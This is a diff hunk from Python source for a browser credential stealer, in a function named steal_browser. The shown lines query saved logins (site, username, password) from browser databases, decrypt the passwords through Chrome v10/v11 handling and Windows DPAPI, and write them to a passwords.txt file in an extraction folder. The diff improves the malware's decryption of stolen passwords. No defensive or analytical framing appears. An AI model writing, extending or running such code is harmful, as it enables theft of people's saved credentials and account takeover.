@@ -204,11 +204,27 @@ def steal_browser():
                     c.execute("SELECT origin_url, username_value, password_value FROM logins")
                     with open(os.path.join(EXTRACT_FOLDER, "passwords.txt"), "a", encoding="utf-8", errors="ignore") as f:
                         for row in c.fetchall():
-                            # Skip empty password blobs
-                            if not row[2]:
+                            blob = row[2]
+                            if not blob:
                                 continue
-                            decrypted_pw = decrypt(row[2], key)
+
+                            # decide how to handle the blob
+                            try:
+                                if isinstance(blob, str):  # mock/plaintext you inserted manually
+                                    decrypted_pw = blob
+                                elif blob[:3] in (b'v10', b'v11') or blob.startswith(b'\x01'):  # real encrypted
+                                    decrypted_pw = decrypt(blob, key)
+                                else:
+                                    # try DPAPI once, otherwise treat as bytes->string
+                                    try:
+                                        decrypted_pw = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode("utf-8", "ignore")
+                                    except Exception:
+                                        decrypted_pw = blob.decode("utf-8", "ignore")
+                            except Exception as e:
+                                decrypted_pw = f"[FAILED: {e}]"
+
                             f.write(f"[{name}] {row[0]} | {row[1]} | {decrypted_pw}\n")
+
                 except: pass
                 c.connection.close()
                 os.remove("tmp_pwd.db")
